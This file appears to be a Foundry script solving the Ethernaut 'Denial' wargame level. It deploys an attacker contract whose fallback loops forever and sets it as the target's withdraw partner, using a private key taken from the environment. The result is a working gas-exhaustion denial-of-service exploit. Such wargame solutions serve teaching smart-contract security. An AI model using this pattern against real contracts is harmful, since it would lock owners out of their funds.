// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Denial.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    Denial public denial;

    constructor (address _address) {
        denial = Denial(payable(_address));
    }

    function attack() public {
        denial.withdraw();
    }

    fallback() external payable {
        while (true) {}
    }
}

contract DenialSolution is Script {
    Denial public denial = Denial(payable(0x086d1B28595de58d6f137D9185aAB121516f1AEC));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Owner : ", denial.owner());
        console.log("Before Contract Balance : ", denial.contractBalance());

        AttackerContract attackerContract = new AttackerContract(address(denial));

        console.log("Before Partner Balance : ", address(attackerContract).balance);

        denial.setWithdrawPartner(address(attackerContract));

        console.log("After Contract Balence : ", denial.contractBalance());
        console.log("After Partner Balance : ", address(attackerContract).balance);

        vm.stopBroadcast();
    }
}